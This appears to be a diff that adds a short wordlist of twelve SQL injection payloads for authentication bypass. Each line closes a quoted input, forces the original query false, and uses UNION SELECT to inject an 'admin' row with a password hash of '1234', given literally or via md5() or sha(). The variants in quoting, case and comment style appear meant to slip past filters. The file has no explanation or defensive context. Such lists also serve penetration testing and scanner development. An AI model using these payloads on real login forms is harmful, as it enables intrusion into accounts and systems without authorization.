@@ -1,0 +1,12 @@
+1234' AND 1=0 UniON SeleCT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234' AND 1=0 UniON SeleCT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'#
+1234' AND 1=0 UniON ALL SeleCT 'admin', md5('1234
+1234' AND 1=0 UniON ALL SeleCT 'admin', md5('1234')#
+1234' and 1=0 union select 'admin',sha('1234
+1234' and 1=0 union select 'admin',sha('1234')#
+1234" AND 1=0 UniON SeleCT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234" AND 1=0 UniON SeleCT "admin", "81dc9bdb52d04dc20036dbd8313ed055"#
+1234" AND 1=0 UniON ALL SeleCT "admin", md5("1234
+1234" AND 1=0 UniON ALL SeleCT "admin", md5("1234")#
+1234" and 1=0 union select "admin",sha("1234
+1234" and 1=0 union select "admin",sha("1234")#
